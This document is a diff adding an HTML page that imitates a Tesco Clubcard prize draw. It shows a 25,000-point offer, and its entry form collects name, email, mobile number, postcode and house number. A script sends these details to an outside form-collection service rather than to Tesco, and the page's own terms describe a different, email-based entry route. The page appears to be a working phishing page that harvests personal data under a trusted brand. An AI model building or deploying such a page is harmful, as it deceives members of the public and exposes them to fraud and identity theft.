@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>25,000 Clubcard Points – Tesco Prize Draw</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --tesco-blue: #00539f;
+    --tesco-blue-dark: #003d75;
+    --tesco-blue-light: #e6eef6;
+    --tesco-green: #00893e;
+    --text-dark: #1a2b3c;
+    --text-mid: #4a5568;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Nunito Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: linear-gradient(135deg, #003d75 0%, #00539f 55%, #0073c4 100%);
+    min-height: 100vh;
+    padding: 24px 16px;
+    color: var(--text-dark);
+  }
+
+  .card {
+    background: #ffffff;
+    border-radius: 24px;
+    max-width: 680px;
+    width: 100%;
+    margin: 0 auto;
+    overflow: hidden;
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.35);
+    animation: floatIn 0.8s ease-out;
+  }
+
+  @keyframes floatIn {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .hero {
+    background: linear-gradient(135deg, var(--tesco-blue), #0073c4);
+    padding: 28px 24px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+
+  .hero img.prize-gif {
+    width: 100%;
+    max-width: 460px;
+    height: auto;
+    border-radius: 14px;
+    display: block;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.3);
+  }
+
+  .content { padding: 36px 32px 40px; text-align: center; }
+
+  .badge {
+    display: inline-block;
+    background: var(--tesco-blue-light);
+    color: var(--tesco-blue);
+    font-weight: 800;
+    font-size: 13px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    padding: 8px 16px;
+    border-radius: 999px;
+    margin-bottom: 20px;
+  }
+
+  h1 {
+    font-size: 1.55rem;
+    line-height: 1.35;
+    color: var(--text-dark);
+    margin-bottom: 8px;
+    font-weight: 800;
+  }
+
+  h1 .points-highlight {
+    color: var(--tesco-blue);
+    font-weight: 900;
+  }
+
+  .greeting {
+    font-size: 1.1rem;
+    color: var(--text-mid);
+    margin-bottom: 18px;
+    font-weight: 600;
+  }
+
+  .sub {
+    font-size: 1rem;
+    color: var(--text-mid);
+    line-height: 1.6;
+    margin-bottom: 26px;
+  }
+
+  .entry-form {
+    text-align: left;
+    background: #f7f9fc;
+    border: 1px solid #e2e8f0;
+    border-radius: 16px;
+    padding: 24px 22px;
+    margin-bottom: 20px;
+  }
+
+  .form-row { display: flex; gap: 14px; margin-bottom: 16px; }
+  .form-row .field { flex: 1; }
+  .field { margin-bottom: 16px; }
+  .field:last-child { margin-bottom: 0; }
+
+  .field label {
+    display: block;
+    font-size: 0.82rem;
+    font-weight: 800;
+    color: var(--tesco-blue);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.4px;
+  }
+
+  .field input {
+    width: 100%;
+    padding: 12px 14px;
+    border: 2px solid #d5dde6;
+    border-radius: 10px;
+    font-size: 0.95rem;
+    font-family: inherit;
+    color: var(--text-dark);
+    background: #fff;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .field input:focus {
+    outline: none;
+    border-color: var(--tesco-blue);
+    box-shadow: 0 0 0 3px rgba(0, 83, 159, 0.15);
+  }
+
+  .field input::placeholder { color: #a7b4c2; }
+
+  .form-note {
+    font-size: 0.78rem;
+    color: var(--text-mid);
+    font-weight: 700;
+    margin-bottom: 14px;
+    padding-left: 2px;
+  }
+
+  .btn {
+    display: block;
+    width: 100%;
+    background: var(--tesco-blue);
+    color: #fff;
+    font-size: 1.15rem;
+    font-weight: 900;
+    font-family: inherit;
+    letter-spacing: 0.3px;
+    padding: 16px 48px;
+    border-radius: 999px;
+    text-decoration: none;
+    box-shadow: 0 8px 20px rgba(0, 83, 159, 0.4);
+    transition: transform 0.2s, box-shadow 0.2s, background 0.2s;
+    border: none;
+    cursor: pointer;
+    margin-top: 18px;
+  }
+
+  .btn:hover {
+    background: var(--tesco-blue-dark);
+    transform: translateY(-2px);
+    box-shadow: 0 12px 28px rgba(0, 83, 159, 0.55);
+  }
+
+  .btn:active { transform: translateY(0); }
+  .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+
+  .thankyou {
+    display: none;
+    background: var(--tesco-blue-light);
+    border: 2px solid var(--tesco-blue);
+    border-radius: 16px;
+    padding: 30px 24px;
+    text-align: center;
+    animation: floatIn 0.6s ease-out;
+    margin-bottom: 8px;
+  }
+
+  .thankyou.show { display: block; }
+
+  .thankyou .tick {
+    width: 56px;
+    height: 56px;
+    margin: 0 auto 16px;
+    background: var(--tesco-green);
+    color: #fff;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.9rem;
+    font-weight: 900;
+    box-shadow: 0 6px 16px rgba(0, 137, 62, 0.4);
+  }
+
+  .thankyou h2 {
+    font-size: 1.3rem;
+    color: var(--tesco-blue);
+    margin-bottom: 12px;
+    font-weight: 900;
+  }
+
+  .thankyou p {
+    font-size: 1rem;
+    color: var(--text-mid);
+    line-height: 1.6;
+    font-weight: 600;
+  }
+
+  .info-section {
+    background: #f7f9fc;
+    padding: 32px 28px;
+    border-top: 1px solid #e2e8f0;
+  }
+
+  .info-section h2 {
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin-bottom: 16px;
+    text-align: center;
+    font-weight: 900;
+  }
+
+  .info-section p {
+    font-size: 0.85rem;
+    color: var(--text-mid);
+    line-height: 1.65;
+    margin-bottom: 12px;
+    text-align: left;
+  }
+
+  .info-section p.rating {
+    text-align: center;
+    font-weight: 800;
+    color: var(--tesco-blue);
+    margin-bottom: 20px;
+  }
+
+  .info-section h3 {
+    font-size: 0.95rem;
+    color: var(--text-dark);
+    margin: 22px 0 10px;
+    text-align: center;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    font-weight: 900;
+  }
+
+  .tc-list {
+    list-style: none;
+    counter-reset: tc;
+    padding: 0;
+    margin: 0;
+  }
+
+  .tc-list li {
+    counter-increment: tc;
+    font-size: 0.8rem;
+    color: var(--text-mid);
+    line-height: 1.6;
+    margin-bottom: 10px;
+    padding-left: 26px;
+    position: relative;
+    text-align: left;
+  }
+
+  .tc-list li::before {
+    content: counter(tc) ".";
+    position: absolute;
+    left: 0;
+    font-weight: 900;
+    color: var(--tesco-blue);
+  }
+
+  .footer {
+    text-align: center;
+    padding: 20px;
+    font-size: 0.75rem;
+    color: #8895a7;
+    background: #fff;
+    border-top: 1px solid #e2e8f0;
+    font-weight: 600;
+  }
+
+  @media (max-width: 520px) {
+    .form-row { flex-direction: column; gap: 0; }
+    .content { padding: 28px 20px 32px; }
+    h1 { font-size: 1.3rem; }
+    .info-section { padding: 24px 18px; }
+    .btn { padding: 15px 32px; font-size: 1.05rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <div class="hero">
+    <img
+      class="prize-gif"
+      src="https://d3aaoo30se75mz.cloudfront.net/1879/2026_09_23_15_06_05/Prize%2520Draw%2520Examples%2520%2520(8).gif"
+      alt="Tesco Prize Draw – 25,000 Clubcard points">
+  </div>
+
+  <div class="content">
+    <div class="badge">Tesco Prize Draw</div>
+    <p class="greeting">Hi,</p>
+    <h1>
+      <span class="points-highlight">25,000</span> Clubcard points could be just a click away.
+    </h1>
+    <p class="sub">
+      Enter now for your chance to be one of 6 lucky winners and collect points worth £250!
+    </p>
+
+    <form
+      class="entry-form"
+      id="entryForm"
+      action="https://submit-form.com/BpWUrqEsQ"
+      method="POST"
+      novalidate
+    >
+      <div class="form-row">
+        <div class="field">
+          <label for="fullName">Full Name</label>
+          <input type="text" id="fullName" name="Full Name" placeholder="Enter your full name" required>
+        </div>
+        <div class="field">
+          <label for="email">Email Address</label>
+          <input type="email" id="email" name="Email Address" placeholder="you@example.com" required>
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="field">
+          <label for="mobile">Mobile No</label>
+          <input type="tel" id="mobile" name="Mobile No" placeholder="07XXX XXXXXX" required>
+        </div>
+        <div class="field">
+          <label for="postcode">Post Code</label>
+          <input type="text" id="postcode" name="Post Code" placeholder="e.g. SW1A 1AA" required>
+        </div>
+      </div>
+
+      <div class="field">
+        <label for="houseFlat">House/Flat</label>
+        <input type="text" id="houseFlat" name="House/Flat" placeholder="Enter your house or flat number" required>
+      </div>
+
+      <p class="form-note">This offer is available for Tesco Mobile Pay Monthly Customers only.</p>
+
+      <button type="submit" class="btn" id="submitBtn">Enter Now</button>
+    </form>
+
+    <div class="thankyou" id="thankyou">
+      <div class="tick">✓</div>
+      <h2>Thank You</h2>
+      <p>Our Tesco Clubcard Reward Partners team will be in touch with you shortly.</p>
+    </div>
+  </div>
+
+  <div class="info-section">
+    <h2>Important Information</h2>
+    <p class="rating">Trustpilot 4.4 rating correct as of 03 August 2026</p>
+    <p>
+      Tesco Travel Insurance is arranged and administered by Rock Insurance Services Limited
+      and underwritten by AWP P&amp;C S.A. Gadget Cover is underwritten by
+      AmTrust Specialty Limited (AmTrust).
+    </p>
+
+    <h3>Terms and Conditions</h3>
+    <ol class="tc-list">
+      <li>“The Promoter” of this prize draw is Tesco Insurance, a trading name of Tesco Personal Finance Ltd. Registered in Scotland No SC173199. Registered Office: 2 South Gyle Crescent, Edinburgh EH12 9FQ. Authorised and regulated by the Financial Conduct Authority.</li>
+      <li>The prize draw opens on the 21 September 2026 and closes on 5 October 2026. Entries received outside of this period will not be accepted.</li>
+      <li>To be eligible for this prize draw, you must be a UK resident (England, Scotland, Wales and Northern Ireland), be 18 years of age or older, hold a valid Tesco Clubcard and have been directly targeted.</li>
+      <li>To enter, you must select only one insurance renewal month from the options provided via the designated email entry route by 5 October 2026.</li>
+      <li>Each valid insurance renewal month submitted via the designated entry route will constitute one entry into the prize draw. A limit of one entry per customer applies and entries submitted via channels other than the specified email route will not be eligible. Where multiple selections or submissions are made, only the first valid response received via the designated entry route will be counted and any additional responses will be disregarded.</li>
+      <li>There are six prizes in total. Each winner will receive 25,000 Tesco Clubcard points worth £250. The prize is non-transferable and no cash alternative will be offered for Clubcard points.</li>
+      <li>All eligible customers who have provided a renewal month within the prize draw period via the designated entry route, will be entered into the prize draw and six winners will be selected at random from all valid entries received. Winners will be contacted by Tesco Insurance via email by 19 October 2026. It’s the responsibility of entrants to ensure their email address is accurate. The Promoter cannot be held responsible for missed or delayed communications. Winners are not required to reply to the prize notification email address. If a winner cannot be contacted, The Promoter reserves the right to select an alternative winner.</li>
+      <li>Prizes will be awarded to the winner’s Tesco Clubcard account by 31 October 2026. Points are valid for two years once the Clubcard points have been converted into vouchers. The Clubcard points will be eligible for transfer to the winner’s Tesco Clubcard account in line with their November 2026 statement. The opportunity to redeem Tesco Clubcard points sits with the customer. Points collected from Tesco Insurance will be credited to the Clubcard member’s account separately to points collected elsewhere. Clubcard terms and conditions can be found here: Terms and conditions - Clubcard - Tesco Groceries.</li>
+      <li>By providing your renewal month and in line with your communications preferences and our Privacy Policy, you agree to us using these details to send you information about our insurance products in the future.</li>
+      <li>The Promoter reserves the right to amend or withdraw this prize draw at any time where necessary due to circumstances outside its control. Our decision is final and binding, and no correspondence will be entered into. If we have reasonable grounds to believe that you have engaged in any fraud or material abuse of this prize draw (such as attempting to obtain an unfair advantage through deception) we may, in our sole discretion, take any actions we see fit in the circumstances.</li>
+      <li>The Promoter accepts no responsibility for entries not successfully submitted due to technical fault, technical malfunction, computer hardware or software failure, satellite, network or server failure of any kind.</li>
+      <li>The application and interpretation of these terms and conditions shall be governed by the law of England and Wales and the courts of England and Wales shall have exclusive jurisdiction in relation to any dispute concerning them.</li>
+    </ol>
+  </div>
+
+  <div class="footer">
+    © 2026 Tesco Personal Finance Ltd. All rights reserved.
+  </div>
+
+</div>
+
+<script>
+  (function() {
+    var form = document.getElementById('entryForm');
+    var thankyou = document.getElementById('thankyou');
+    var submitBtn = document.getElementById('submitBtn');
+
+    if (!form || !thankyou || !submitBtn) {
+      console.error('Required elements not found');
+      return;
+    }
+
+    form.addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      // Validate fields
+      var required = form.querySelectorAll('[required]');
+      var valid = true;
+      required.forEach(function(input) {
+        if (!input.value.trim()) {
+          input.style.borderColor = '#d40000';
+          valid = false;
+        } else {
+          input.style.borderColor = '#d5dde6';
+        }
+      });
+
+      if (!valid) return;
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Submitting...';
+
+      // Collect data as plain object (Formspark's recommended AJAX approach)
+      var data = {
+        'Full Name': document.getElementById('fullName').value.trim(),
+        'Email Address': document.getElementById('email').value.trim(),
+        'Mobile No': document.getElementById('mobile').value.trim(),
+        'Post Code': document.getElementById('postcode').value.trim(),
+        'House/Flat': document.getElementById('houseFlat').value.trim()
+      };
+
+      try {
+        var response = await fetch(form.action, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          // Success — show Tesco-styled thank-you
+          form.style.display = 'none';
+          thankyou.classList.add('show');
+          thankyou.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        } else {
+          throw new Error('Server returned ' + response.status);
+        }
+      } catch (err) {
+        console.error('Submission error:', err);
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Enter Now';
+        alert('Sorry, something went wrong. Please check your connection and try again.');
+      }
+    });
+  })();
+</script>
+
+</body>
+</html>
